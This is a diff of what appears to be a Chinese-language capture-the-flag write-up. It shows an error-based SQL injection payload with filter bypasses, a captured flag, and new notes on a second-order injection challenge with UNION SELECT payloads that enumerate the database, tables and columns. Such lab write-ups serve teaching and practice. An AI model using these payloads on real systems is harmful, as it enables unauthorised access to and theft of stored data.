@@ -346,4 +346,14 @@ shit'/**/anandd/**/updatexml(1,concat(0x7e,(seselectlect/**/left(group_concat(id
 flaghazel{9f2da823-12fd-4ae8-
 flag:
 hazel{9f2da823-12fd-4ae8-acd2-2f7200071e54}
-[嘤嘤嘤]
+[嘤嘤嘤]sql_twicesql
+二次注入，登陆后的输入框会注释掉我们的引号。
+而用户名注入又不会回显错误，所以 想用orderby确定列数是不现实的。
+第一步直接`1' union select database() #`
+数据库名：ctftraining
+接下来
+`1' union select group_concat(table_name) from information_schema.tables where table_schema=database()#`
+表名：flag,news,users
+接下来
+`1' union select group_concat(column_name) from information_schema.columns where table_name='flag'#`
+列名：flag
